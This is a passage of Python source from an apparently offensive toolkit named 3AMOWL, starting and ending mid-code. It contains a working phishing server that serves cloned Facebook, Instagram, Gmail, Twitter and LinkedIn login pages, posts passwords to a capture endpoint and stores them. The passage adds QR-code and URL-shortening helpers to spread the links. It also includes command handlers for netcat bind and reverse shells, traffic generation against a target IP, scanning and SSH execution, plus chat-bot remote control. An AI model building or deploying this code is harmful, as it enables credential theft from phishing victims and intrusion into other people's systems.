            self.send_response(302)
            self.send_header('Location', 'https://www.google.com')
            self.end_headers()
        except Exception as e:
            self.send_response(500)
            self.end_headers()
    
    def send_phishing_page(self):
        if self.server_instance and self.server_instance.html_content:
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(self.server_instance.html_content.encode('utf-8'))
            if self.server_instance.db and self.server_instance.link_id:
                self.server_instance.db.update_phishing_link_clicks(self.server_instance.link_id)

class PhishingServer:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.server = None
        self.server_thread = None
        self.running = False
        self.port = 8080
        self.link_id = None
        self.platform = None
        self.html_content = None
    
    def start(self, link_id: str, platform: str, html_content: str, port: int = 8080) -> bool:
        try:
            self.link_id = link_id
            self.platform = platform
            self.html_content = html_content
            self.port = port
            
            handler = PhishingRequestHandler
            handler.server_instance = self
            self.server = socketserver.TCPServer(("0.0.0.0", port), handler)
            self.server_thread = threading.Thread(target=self.server.serve_forever, daemon=True)
            self.server_thread.start()
            self.running = True
            logger.info(f"Phishing server started on port {port}")
            return True
        except Exception as e:
            logger.error(f"Failed to start phishing server: {e}")
            return False
    
    def stop(self):
        if self.server:
            self.server.shutdown()
            self.server.server_close()
            self.running = False
    
    def get_url(self) -> str:
        return f"http://{NetworkTools.get_local_ip()}:{self.port}"

# =====================
# SOCIAL ENGINEERING TOOLS
# =====================
class SocialEngineeringTools:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.phishing_server = PhishingServer(db)
        self.active_links = {}
    
    def generate_phishing_link(self, platform: str) -> Dict[str, Any]:
        try:
            link_id = str(uuid.uuid4())[:8]
            
            templates = {
                "facebook": self.db._get_facebook_template(),
                "instagram": self.db._get_instagram_template(),
                "twitter": self.db._get_twitter_template(),
                "gmail": self.db._get_gmail_template(),
                "linkedin": self.db._get_linkedin_template()
            }
            
            html_content = templates.get(platform, self._get_custom_template())
            
            phishing_link = PhishingLink(
                id=link_id,
                platform=platform,
                original_url=f"https://www.{platform}.com",
                phishing_url=f"http://localhost:8080",
                template=platform,
                created_at=datetime.datetime.now().isoformat()
            )
            self.db.save_phishing_link(phishing_link)
            self.active_links[link_id] = {'platform': platform, 'html': html_content}
            
            return {'success': True, 'link_id': link_id, 'platform': platform}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _get_custom_template(self) -> str:
        return """<!DOCTYPE html>
<html><head><title>Login</title><style>
body{font-family:Arial;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);margin:0;padding:0;display:flex;justify-content:center;align-items:center;min-height:100vh}
.container{max-width:400px;width:100%;padding:20px}
.login-box{background:white;border-radius:10px;padding:40px}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:5px}
button{width:100%;padding:12px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;border:none;border-radius:5px;cursor:pointer}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style></head>
<body><div class=container><div class=login-box><h2>Login</h2>
<form method=POST action=/capture><input type=text name=username placeholder=Username required>
<input type=password name=password placeholder=Password required><button type=submit>Sign In</button></form>
<div class=warning>⚠️ Security test page</div></div></div></body></html>"""
    
    def start_phishing_server(self, link_id: str, port: int = 8080) -> bool:
        if link_id not in self.active_links:
            return False
        return self.phishing_server.start(link_id, self.active_links[link_id]['platform'], 
                                          self.active_links[link_id]['html'], port)
    
    def stop_phishing_server(self):
        self.phishing_server.stop()
    
    def get_server_url(self) -> str:
        return self.phishing_server.get_url()
    
    def get_active_links(self) -> List[Dict]:
        return [{'link_id': lid, 'platform': data['platform']} for lid, data in self.active_links.items()]
    
    def get_captured_credentials(self, link_id: str = None) -> List[Dict]:
        return self.db.get_captured_credentials(link_id)
    
    def generate_qr_code(self, link_id: str) -> Optional[str]:
        link = self.db.get_phishing_link(link_id)
        if not link:
            return None
        url = self.phishing_server.get_url() if self.phishing_server.running else link.get('phishing_url', '')
        qr_filename = os.path.join(PHISHING_DIR, f"qr_{link_id}.png")
        return qr_filename if NetworkTools.generate_qr_code(url, qr_filename) else None
    
    def shorten_url(self, link_id: str) -> Optional[str]:
        link = self.db.get_phishing_link(link_id)
        if not link:
            return None
        url = self.phishing_server.get_url() if self.phishing_server.running else link.get('phishing_url', '')
        return NetworkTools.shorten_url(url)

# =====================
# TELEGRAM BOT
# =====================
class ThreeAMOWLTelegram:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.config = {}
        self.client = None
        self.running = False
    
    def load_config(self) -> Dict:
        try:
            if os.path.exists(TELEGRAM_CONFIG_FILE):
                with open(TELEGRAM_CONFIG_FILE, 'r') as f:
                    return json.load(f)
        except Exception as e:
            logger.error(f"Failed to load Telegram config: {e}")
        return {}
    
    def save_config(self, bot_token: str = "", enabled: bool = True) -> bool:
        try:
            config = {"bot_token": bot_token, "enabled": enabled}
            with open(TELEGRAM_CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except Exception as e:
            logger.error(f"Failed to save Telegram config: {e}")
            return False
    
    async def start(self):
        if not TELETHON_AVAILABLE:
            return False
        if not self.config.get('bot_token'):
            return False
        
        try:
            self.client = TelegramClient('3amowl_session', api_id=1, api_hash='')
            await self.client.start(bot_token=self.config['bot_token'])
            self.running = True
            return True
        except Exception as e:
            logger.error(f"Failed to start Telegram bot: {e}")
            return False
    
    def start_bot_thread(self) -> bool:
        if self.config.get('enabled') and self.config.get('bot_token'):
            thread = threading.Thread(target=self._run_telegram_bot, daemon=True)
            thread.start()
            return True
        return False
    
    def _run_telegram_bot(self):
        try:
            asyncio.run(self.start())
        except Exception as e:
            logger.error(f"Telegram bot error: {e}")

# =====================
# DISCORD BOT
# =====================
class ThreeAMOWLDiscord:
    def __init__(self, command_handler, db: DatabaseManager, monitor: NetworkMonitor):
        self.handler = command_handler
        self.db = db
        self.monitor = monitor
        self.config = {}
        self.bot = None
        self.running = False
    
    def load_config(self) -> Dict:
        try:
            if os.path.exists(DISCORD_CONFIG_FILE):
                with open(DISCORD_CONFIG_FILE, 'r') as f:
                    return json.load(f)
        except Exception as e:
            logger.error(f"Failed to load Discord config: {e}")
        return {}
    
    def save_config(self, token: str, channel_id: str = "", enabled: bool = True, prefix: str = "!") -> bool:
        try:
            config = {"enabled": enabled, "token": token, "channel_id": channel_id, "prefix": prefix}
            with open(DISCORD_CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except Exception as e:
            logger.error(f"Failed to save Discord config: {e}")
            return False
    
    async def start(self):
        if not DISCORD_AVAILABLE:
            return False
        if not self.config.get('token'):
            return False
        
        try:
            intents = discord.Intents.default()
            intents.message_content = True
            self.bot = commands.Bot(command_prefix=self.config.get('prefix', '!'), intents=intents)
            
            @self.bot.event
            async def on_ready():
                self.running = True
                logger.info(f'Discord bot logged in as {self.bot.user}')
            
            @self.bot.command(name='ping')
            async def ping(ctx):
                await ctx.send("Pong!")
            
            @self.bot.command(name='time')
            async def time_cmd(ctx):
                result = self.handler.execute("time", "discord")
                await ctx.send(f"🕐 {result.get('output', 'N/A')}")
            
            @self.bot.command(name='status')
            async def status_cmd(ctx):
                status = self.monitor.get_status()
                await ctx.send(f"Monitoring: {status['monitoring']}, Blocked IPs: {status['blocked_ips']}")
            
            await self.bot.start(self.config['token'])
            return True
        except Exception as e:
            logger.error(f"Failed to start Discord bot: {e}")
            return False
    
    def start_bot_thread(self) -> bool:
        if self.config.get('enabled') and self.config.get('token'):
            thread = threading.Thread(target=self._run_discord_bot, daemon=True)
            thread.start()
            return True
        return False
    
    def _run_discord_bot(self):
        try:
            asyncio.run(self.start())
        except Exception as e:
            logger.error(f"Discord bot error: {e}")

# =====================
# WHATSAPP BOT
# =====================
class ThreeAMOWLWhatsApp:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.config = {}
        self.driver = None
        self.running = False
    
    def load_config(self) -> Dict:
        try:
            if os.path.exists(WHATSAPP_CONFIG_FILE):
                with open(WHATSAPP_CONFIG_FILE, 'r') as f:
                    return json.load(f)
        except Exception as e:
            logger.error(f"Failed to load WhatsApp config: {e}")
        return {}
    
    def save_config(self, phone_number: str = "", enabled: bool = True) -> bool:
        try:
            config = {"enabled": enabled, "phone_number": phone_number, "command_prefix": "/"}
            with open(WHATSAPP_CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except Exception as e:
            logger.error(f"Failed to save WhatsApp config: {e}")
            return False
    
    def start(self):
        if not SELENIUM_AVAILABLE:
            return False
        try:
            chrome_options = Options()
            chrome_options.add_argument("--headless=new")
            service = Service(ChromeDriverManager().install())
            self.driver = webdriver.Chrome(service=service, options=chrome_options)
            self.running = True
            return True
        except Exception as e:
            logger.error(f"Failed to start WhatsApp bot: {e}")
            return False
    
    def stop(self):
        self.running = False
        if self.driver:
            self.driver.quit()
    
    def start_bot_thread(self) -> bool:
        if self.config.get('enabled') and SELENIUM_AVAILABLE:
            thread = threading.Thread(target=self.start, daemon=True)
            thread.start()
            return True
        return False

# =====================
# SLACK BOT
# =====================
class ThreeAMOWLSlack:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.config = {}
        self.client = None
        self.running = False
    
    def load_config(self) -> Dict:
        try:
            if os.path.exists(SLACK_CONFIG_FILE):
                with open(SLACK_CONFIG_FILE, 'r') as f:
                    return json.load(f)
        except Exception as e:
            logger.error(f"Failed to load Slack config: {e}")
        return {}
    
    def save_config(self, bot_token: str = "", enabled: bool = True) -> bool:
        try:
            config = {"enabled": enabled, "bot_token": bot_token}
            with open(SLACK_CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except Exception as e:
            logger.error(f"Failed to save Slack config: {e}")
            return False
    
    def start(self):
        if not SLACK_AVAILABLE:
            return False
        try:
            self.client = WebClient(token=self.config['bot_token'])
            self.running = True
            return True
        except Exception as e:
            logger.error(f"Failed to start Slack bot: {e}")
            return False
    
    def start_bot_thread(self) -> bool:
        if self.config.get('enabled') and self.config.get('bot_token'):
            thread = threading.Thread(target=self.start, daemon=True)
            thread.start()
            return True
        return False

# =====================
# SIGNAL BOT
# =====================
class ThreeAMOWLSignal:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.config = {}
        self.running = False
    
    def load_config(self) -> Dict:
        try:
            if os.path.exists(SIGNAL_CONFIG_FILE):
                with open(SIGNAL_CONFIG_FILE, 'r') as f:
                    return json.load(f)
        except Exception as e:
            logger.error(f"Failed to load Signal config: {e}")
        return {}
    
    def save_config(self, phone_number: str = "", enabled: bool = True) -> bool:
        try:
            config = {"enabled": enabled, "phone_number": phone_number}
            with open(SIGNAL_CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except Exception as e:
            logger.error(f"Failed to save Signal config: {e}")
            return False
    
    def start(self):
        if not SIGNAL_CLI_AVAILABLE:
            return False
        self.running = True
        return True
    
    def start_bot_thread(self) -> bool:
        if self.config.get('enabled') and self.config.get('phone_number'):
            thread = threading.Thread(target=self.start, daemon=True)
            thread.start()
            return True
        return False

# =====================
# IMESSAGE BOT
# =====================
class ThreeAMOWLiMessage:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.config = {}
        self.running = False
    
    def load_config(self) -> Dict:
        try:
            if os.path.exists(IMESSAGE_CONFIG_FILE):
                with open(IMESSAGE_CONFIG_FILE, 'r') as f:
                    return json.load(f)
        except Exception as e:
            logger.error(f"Failed to load iMessage config: {e}")
        return {}
    
    def save_config(self, enabled: bool = True) -> bool:
        try:
            config = {"enabled": enabled}
            with open(IMESSAGE_CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except Exception as e:
            logger.error(f"Failed to save iMessage config: {e}")
            return False
    
    def start(self):
        if not IMESSAGE_AVAILABLE:
            return False
        self.running = True
        return True
    
    def start_bot_thread(self) -> bool:
        if self.config.get('enabled') and IMESSAGE_AVAILABLE:
            thread = threading.Thread(target=self.start, daemon=True)
            thread.start()
            return True
        return False

# =====================
# COMMAND HANDLER
# =====================
class CommandHandler:
    def __init__(self, db: DatabaseManager, ssh_manager: SSHManager = None,
                 nikto_scanner: NiktoScanner = None,
                 traffic_generator: TrafficGeneratorEngine = None,
                 shodan_integration: ShodanIntegration = None,
                 netcat_tools: NetcatTools = None):
        self.db = db
        self.ssh = ssh_manager
        self.nikto = nikto_scanner
        self.traffic_gen = traffic_generator
        self.shodan = shodan_integration
        self.netcat = netcat_tools
        self.social_tools = SocialEngineeringTools(db)
        self.tools = NetworkTools()
        self.command_map = self._setup_command_map()
    
    def _setup_command_map(self) -> Dict[str, callable]:
        return {
            # Time Commands
            'time': self._execute_time,
            'date': self._execute_date,
            'datetime': self._execute_datetime,
            'history': self._execute_history,
            'time_history': self._execute_time_history,
            
            # Shodan Commands
            'shodan': self._execute_shodan,
            'shodan_host': self._execute_shodan_host,
            'shodan_count': self._execute_shodan_count,
            
            # Netcat Commands
            'nc_listen': self._execute_nc_listen,
            'nc_connect': self._execute_nc_connect,
            'nc_scan': self._execute_nc_scan,
            'nc_shell': self._execute_nc_shell,
            'nc_list': self._execute_nc_list,
            'nc_stop': self._execute_nc_stop,
            
            # SSH Commands
            'ssh_add': self._execute_ssh_add,
            'ssh_list': self._execute_ssh_list,
            'ssh_connect': self._execute_ssh_connect,
            'ssh_exec': self._execute_ssh_exec,
            'ssh_disconnect': self._execute_ssh_disconnect,
            
            # Ping and Scan
            'ping': self._execute_ping,
            'scan': self._execute_scan,
            'quick_scan': self._execute_quick_scan,
            'nmap': self._execute_nmap,
            'full_scan': self._execute_full_scan,
            
            # Nikto
            'nikto': self._execute_nikto,
            'nikto_full': self._execute_nikto_full,
            
            # Traffic Generation
            'generate_traffic': self._execute_generate_traffic,
            'traffic_types': self._execute_traffic_types,
            'traffic_stop': self._execute_traffic_stop,
            
            # IP Management
            'add_ip': self._execute_add_ip,
            'remove_ip': self._execute_remove_ip,
            'block_ip': self._execute_block_ip,
            'unblock_ip': self._execute_unblock_ip,
            'list_ips': self._execute_list_ips,
            'ip_info': self._execute_ip_info,
            
            # Social Engineering
            'generate_phishing_link_for_facebook': self._execute_phishing_facebook,
            'generate_phishing_link_for_instagram': self._execute_phishing_instagram,
            'generate_phishing_link_for_twitter': self._execute_phishing_twitter,
            'generate_phishing_link_for_gmail': self._execute_phishing_gmail,
            'generate_phishing_link_for_linkedin': self._execute_phishing_linkedin,
            'phishing_start_server': self._execute_phishing_start,
            'phishing_stop_server': self._execute_phishing_stop,
            'phishing_status': self._execute_phishing_status,
            'phishing_credentials': self._execute_phishing_credentials,
            
            # Info
            'whois': self._execute_whois,
            'dns': self._execute_dns,
            'location': self._execute_location,
            'traceroute': self._execute_traceroute,
            
            # System
            'system': self._execute_system,
            'status': self._execute_status,
            'threats': self._execute_threats,
            'report': self._execute_report,
        }
    
    def execute(self, command: str, source: str = "local") -> Dict[str, Any]:
        start_time = time.time()
        parts = command.strip().split()
        if not parts:
            return {'success': False, 'output': "Empty command"}
        
        cmd_name = parts[0].lower()
        args = parts[1:]
        
        try:
            if cmd_name in self.command_map:
                result = self.command_map[cmd_name](args)
            else:
                result = self._execute_generic(command)
            
            execution_time = time.time() - start_time
            
            self.db.log_command(
                command=command,
                source=source,
                success=result.get('success', False),
                output=str(result.get('output', ''))[:5000],
                execution_time=execution_time
            )
            
            result['execution_time'] = execution_time
            return result
        except Exception as e:
            return {'success': False, 'output': str(e), 'execution_time': time.time() - start_time}
    
    # ==================== Time Command Handlers ====================
    def _execute_time(self, args: List[str]) -> Dict[str, Any]:
        now = datetime.datetime.now()
        tz = now.astimezone().tzinfo
        return {'success': True, 'output': f"🕐 Current Time: {now.strftime('%H:%M:%S')} {tz}"}
    
    def _execute_date(self, args: List[str]) -> Dict[str, Any]:
        now = datetime.datetime.now()
        return {'success': True, 'output': f"📅 Current Date: {now.strftime('%A, %B %d, %Y')}"}
    
    def _execute_datetime(self, args: List[str]) -> Dict[str, Any]:
        now = datetime.datetime.now()
        tz = now.astimezone().tzinfo
        return {'success': True, 'output': f"📅 Date: {now.strftime('%A, %B %d, %Y')}\n🕐 Time: {now.strftime('%H:%M:%S')} {tz}"}
    
    def _execute_history(self, args: List[str]) -> Dict[str, Any]:
        limit = 20
        if args:
            try:
                limit = int(args[0])
            except:
                pass
        history = self.db.get_command_history(limit)
        if not history:
            return {'success': True, 'output': "No command history found"}
        output = f"📜 Command History (Last {len(history)}):\n"
        for i, cmd in enumerate(history, 1):
            status = "✅" if cmd['success'] else "❌"
            output += f"{i:2d}. {status} [{cmd['timestamp'][:19]}] {cmd['command'][:50]}\n"
        return {'success': True, 'output': output}
    
    def _execute_time_history(self, args: List[str]) -> Dict[str, Any]:
        history = self.db.get_time_history(10)
        if not history:
            return {'success': True, 'output': "No time command history found"}
        output = "⏰ Time Command History:\n"
        for cmd in history:
            output += f"  [{cmd['timestamp'][:19]}] {cmd['command']}\n"
        return {'success': True, 'output': output}
    
    # ==================== Shodan Command Handlers ====================
    def _execute_shodan(self, args: List[str]) -> Dict[str, Any]:
        if not self.shodan:
            return {'success': False, 'output': "Shodan not initialized"}
        if not args:
            return {'success': False, 'output': "Usage: shodan <query>"}
        query = ' '.join(args)
        result = self.shodan.search(query)
        if result.error:
            return {'success': False, 'output': result.error}
        output = f"🕷️ Shodan Results for '{query}':\nTotal: {result.total_results}\n"
        for r in result.results[:10]:
            output += f"  {r.get('ip')}:{r.get('port')} - {r.get('org', 'Unknown')}\n"
        return {'success': True, 'output': output, 'data': {'total': result.total_results, 'results': result.results[:20]}}
    
    def _execute_shodan_host(self, args: List[str]) -> Dict[str, Any]:
        if not self.shodan or not args:
            return {'success': False, 'output': "Usage: shodan_host <ip>"}
        result = self.shodan.host_info(args[0])
        if result.get('success'):
            output = f"🕷️ Host: {result.get('ip')}\n  Org: {result.get('org')}\n  ISP: {result.get('isp')}\n  Country: {result.get('country')}\n  Open Ports: {result.get('ports', [])}"
            return {'success': True, 'output': output, 'data': result}
        return {'success': False, 'output': result.get('error', 'Unknown error')}
    
    def _execute_shodan_count(self, args: List[str]) -> Dict[str, Any]:
        if not self.shodan or not args:
            return {'success': False, 'output': "Usage: shodan_count <query>"}
        result = self.shodan.count(' '.join(args))
        return {'success': result.get('success', False), 'output': f"Count: {result.get('total', 0)}", 'data': result}
    
    # ==================== Netcat Command Handlers ====================
    def _execute_nc_listen(self, args: List[str]) -> Dict[str, Any]:
        if not self.netcat:
            return {'success': False, 'output': "Netcat not initialized"}
        if not args:
            return {'success': False, 'output': "Usage: nc_listen <port> [mode]"}
        port = int(args[0])
        mode = args[1] if len(args) > 1 else "listen"
        result = self.netcat.create_listener(port, mode)
        return {'success': result['success'], 'output': result.get('message', result.get('error', ''))}
    
    def _execute_nc_connect(self, args: List[str]) -> Dict[str, Any]:
        if not self.netcat or len(args) < 2:
            return {'success': False, 'output': "Usage: nc_connect <host> <port>"}
        result = self.netcat.connect(args[0], int(args[1]))
        return {'success': result['success'], 'output': result.get('output', result.get('error', ''))}
    
    def _execute_nc_scan(self, args: List[str]) -> Dict[str, Any]:
        if not self.netcat or not args:
            return {'success': False, 'output': "Usage: nc_scan <target> [ports]"}
        target = args[0]
        ports = args[1] if len(args) > 1 else "1-1000"
        result = self.netcat.port_scan(target, ports)
        output = f"📡 Port scan of {target}:\nOpen ports: {result.get('open_ports', [])}\nTotal open: {result.get('open_count', 0)}"
        return {'success': True, 'output': output, 'data': result}
    
    def _execute_nc_shell(self, args: List[str]) -> Dict[str, Any]:
        if not self.netcat or len(args) < 2:
            return {'success': False, 'output': "Usage: nc_shell <bind|reverse> <port> [lhost]"}
        shell_type = args[0].lower()
        port = int(args[1])
        if shell_type == 'bind':
            result = self.netcat.bind_shell(port)
        elif shell_type == 'reverse' and len(args) >= 3:
            result = self.netcat.reverse_shell(args[2], port)
        else:
            return {'success': False, 'output': "Invalid shell type or missing lhost"}
        return {'success': result['success'], 'output': result.get('message', result.get('error', ''))}
    
    def _execute_nc_list(self, args: List[str]) -> Dict[str, Any]:
        if not self.netcat:
            return {'success': False, 'output': "Netcat not initialized"}
        listeners = self.netcat.get_listeners()
        if not listeners:
            return {'success': True, 'output': "No active listeners"}
        output = "📡 Active Netcat Listeners:\n"
        for l in listeners:
            output += f"  {l['id']}:{l['port']} ({l['mode']}) - {l['connections']} connections\n"
        return {'success': True, 'output': output, 'data': {'listeners': listeners}}
    
    def _execute_nc_stop(self, args: List[str]) -> Dict[str, Any]:
        if not self.netcat:
            return {'success': False, 'output': "Netcat not initialized"}
        listener_id = args[0] if args else None
        if listener_id:
            self.netcat.stop_listener(listener_id)
            return {'success': True, 'output': f"Stopped listener {listener_id}"}
        else:
            self.netcat.stop_listener()
            return {'success': True, 'output': "Stopped all listeners"}
    
    # ==================== SSH Command Handlers ====================
    def _execute_ssh_add(self, args: List[str]) -> Dict[str, Any]:
        if not self.ssh or len(args) < 3:
            return {'success': False, 'output': "Usage: ssh_add <name> <host> <username> [password] [port]"}
        name, host, username = args[0], args[1], args[2]
        password = args[3] if len(args) > 3 else None
        port = int(args[4]) if len(args) > 4 and args[4].isdigit() else 22
        result = self.ssh.add_server(name, host, username, password, None, port)
        return {'success': result['success'], 'output': result.get('message', result.get('error', ''))}
    
    def _execute_ssh_list(self, args: List[str]) -> Dict[str, Any]:
        if not self.ssh:
            return {'success': False, 'output': "SSH not initialized"}
        servers = self.ssh.get_servers()
        if not servers:
            return {'success': True, 'output': "No SSH servers configured"}
        output = "🔌 Configured SSH Servers:\n"
        for s in servers:
            status = "🟢" if s.get('connected') else "🔴"
            output += f"  {status} {s['name']} ({s['id'][:8]}) - {s['host']}:{s['port']} as {s['username']}\n"
        return {'success': True, 'output': output, 'data': {'servers': servers}}
    
    def _execute_ssh_connect(self, args: List[str]) -> Dict[str, Any]:
        if not self.ssh or not args:
            return {'success': False, 'output': "Usage: ssh_connect <server_id>"}
        result = self.ssh.connect(args[0])
        return {'success': result['success'], 'output': result.get('message', result.get('error', ''))}
    
    def _execute_ssh_exec(self, args: List[str]) -> Dict[str, Any]:
        if not self.ssh or len(args) < 2:
            return {'success': False, 'output': "Usage: ssh_exec <server_id> <command>"}
        server_id, command = args[0], ' '.join(args[1:])
        result = self.ssh.execute_command(server_id, command, executed_by="cli")
        output = f"💻 Command: {command}\nOutput:\n{result.output}"
        if result.error:
            output += f"\nError: {result.error}"
        return {'success': result.success, 'output': output}
    
    def _execute_ssh_disconnect(self, args: List[str]) -> Dict[str, Any]:
        if not self.ssh:
            return {'success': False, 'output': "SSH not initialized"}
        if args:
            self.ssh.disconnect(args[0])
            return {'success': True, 'output': f"Disconnected from {args[0]}"}
        else:
            self.ssh.disconnect()
            return {'success': True, 'output': "Disconnected from all servers"}
    
    # ==================== Ping and Scan Handlers ====================
    def _execute_ping(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return {'success': False, 'output': "Usage: ping <target>"}
        result = self.tools.ping(args[0])
        return {'success': result['success'], 'output': result['output']}
    
    def _execute_scan(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return {'success': False, 'output': "Usage: scan <target>"}
        result = self.tools.nmap_scan(args[0], "quick")
        return {'success': result['success'], 'output': result['output'][:2000]}
    
    def _execute_quick_scan(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return {'success': False, 'output': "Usage: quick_scan <target>"}
        result = self.tools.nmap_scan(args[0], "quick")
        return {'success': result['success'], 'output': result['output'][:2000]}
    
    def _execute_nmap(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return {'success': False, 'output': "Usage: nmap <target> [type]"}
        target = args[0]
        scan_type = args[1] if len(args) > 1 else "quick"
        result = self.tools.nmap_scan(target, scan_type)
        return {'success': result['success'], 'output': result['output'][:3000]}
    
    def _execute_full_scan(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return {'success': False, 'output': "Usage: full_scan <target>"}
        result = self.tools.nmap_scan(args[0], "full")
        return {'success': result['success'], 'output': result['output'][:4000]}
    
    def _execute_traceroute(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return {'success': False, 'output': "Usage: traceroute <target>"}
        result = self.tools.traceroute(args[0])
        return {'success': result['success'], 'output': result['output']}
    
    # ==================== Nikto Handlers ====================
    def _execute_nikto(self, args: List[str]) -> Dict[str, Any]:
        if not self.nikto or not args:
            return {'success': False, 'output': "Usage: nikto <target>"}
        result = self.nikto.scan(args[0])
        if result.success:
            output = f"🕷️ Nikto scan of {args[0]}:\nFound {len(result.vulnerabilities)} vulnerabilities\n"
            for v in result.vulnerabilities[:10]:
                output += f"  - {v.get('description', 'Unknown')[:100]}\n"
            return {'success': True, 'output': output, 'data': {'vulnerabilities': result.vulnerabilities}}
        return {'success': False, 'output': result.error}
    
    def _execute_nikto_full(self, args: List[str]) -> Dict[str, Any]:
        if not self.nikto or not args:
            return {'success': False, 'output': "Usage: nikto_full <target>"}
        result = self.nikto.scan(args[0], {'tuning': '123456789', 'level': 3})
        output = f"🕷️ Full Nikto scan of {args[0]}:\nFound {len(result.vulnerabilities)} vulnerabilities\n"
        return {'success': result.success, 'output': output, 'data': {'vulnerabilities': result.vulnerabilities}}
    
    # ==================== Traffic Generation Handlers ====================
    def _execute_generate_traffic(self, args: List[str]) -> Dict[str, Any]:
        if not self.traffic_gen or len(args) < 3:
            return {'success': False, 'output': "Usage: generate_traffic <type> <ip> <duration> [port]"}
        traffic_type, target_ip, duration = args[0].lower(), args[1], int(args[2])
        port = int(args[3]) if len(args) > 3 else None
        try:
            generator = self.traffic_gen.generate_traffic(traffic_type, target_ip, duration, port, executed_by="cli")
            return {'success': True, 'output': f"🚀 Generating {traffic_type} traffic to {target_ip} for {duration}s", 'data': {'generator': asdict(generator)}}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    def _execute_traffic_types(self, args: List[str]) -> Dict[str, Any]:
        if not self.traffic_gen:
            return {'success': False, 'output': "Traffic generator not initialized"}
        types = self.traffic_gen.get_available_traffic_types()
        return {'success': True, 'output': f"Available traffic types: {', '.join(types)}", 'data': {'types': types}}
    
    def _execute_traffic_stop(self, args: List[str]) -> Dict[str, Any]:
        if not self.traffic_gen:
            return {'success': False, 'output': "Traffic generator not initialized"}
        if args:
            self.traffic_gen.stop_generation(args[0])
            return {'success': True, 'output': f"Stopped generator {args[0]}"}
        else:
            self.traffic_gen.stop_generation()
            return {'success': True, 'output': "Stopped all generators"}
    
    # ==================== IP Management Handlers ====================
    def _execute_add_ip(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return {'success': False, 'output': "Usage: add_ip <ip> [notes]"}
        ip = args[0]
        notes = ' '.join(args[1:]) if len(args) > 1 else ""
        success = self.db.add_managed_ip(ip, "cli", notes)
        return {'success': success, 'output': f"IP {ip} {'added' if success else 'already exists'}"}
    
    def _execute_remove_ip(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return {'success': False, 'output': "Usage: remove_ip <ip>"}
        success = self.db.remove_managed_ip(args[0])
        return {'success': success, 'output': f"IP {args[0]} {'removed' if success else 'not found'}"}
    
    def _execute_block_ip(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return {'success': False, 'output': "Usage: block_ip <ip> [reason]"}
        ip = args[0]
        reason = ' '.join(args[1:]) if len(args) > 1 else "Manually blocked"
        success = self.db.block_ip(ip, reason, "cli")
        return {'success': success, 'output': f"IP {ip} {'blocked' if success else 'failed to block'}"}
    
    def _execute_unblock_ip(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return {'success': False, 'output': "Usage: unblock_ip <ip>"}
        success = self.db.unblock_ip(args[0], "cli")
        return {'success': success, 'output': f"IP {args[0]} {'unblocked' if success else 'not found'}"}
    
    def _execute_list_ips(self, args: List[str]) -> Dict[str, Any]:
        ips = self.db.get_managed_ips()
        if not ips:
            return {'success': True, 'output': "No managed IPs"}
        output = "🔒 Managed IPs:\n"
        for ip in ips:
            status = "🔴 BLOCKED" if ip.get('is_blocked') else "🟢 Active"
            output += f"  {ip['ip_address']} - {status} - alerts: {ip.get('alert_count', 0)}\n"
        return {'success': True, 'output': output, 'data': {'ips': ips}}
    
    def _execute_ip_info(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return {'success': False, 'output': "Usage: ip_info <ip>"}
        ip = args[0]
        db_info = self.db.get_ip_info(ip)
        location = self.tools.get_ip_location(ip)
        output = f"📍 IP Information for {ip}:\n"
        if location.get('success'):
            output += f"  Country: {location.get('country')}\n  City: {location.get('city')}\n  ISP: {location.get('isp')}\n"
        if db_info:
            status = "BLOCKED" if db_info.get('is_blocked') else "Active"
            output += f"  Status: {status}\n  Alert count: {db_info.get('alert_count', 0)}\n"
        return {'success': True, 'output': output, 'data': {'ip_info': db_info, 'location': location}}
    
    # ==================== Info Handlers ====================
    def _execute_whois(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return {'success': False, 'output': "Usage: whois <domain>"}
        result = self.tools.whois_lookup(args[0])
        return {'success': result['success'], 'output': result['output'][:2000]}
    
    def _execute_dns(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return {'success': False, 'output': "Usage: dns <domain>"}
        result = subprocess.run(['dig', args[0], '+short'], capture_output=True, text=True)
        return {'success': True, 'output': result.stdout[:1000]}
    
    def _execute_location(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return {'success': False, 'output': "Usage: location <ip>"}
        result = self.tools.get_ip_location(args[0])
        if result.get('success'):
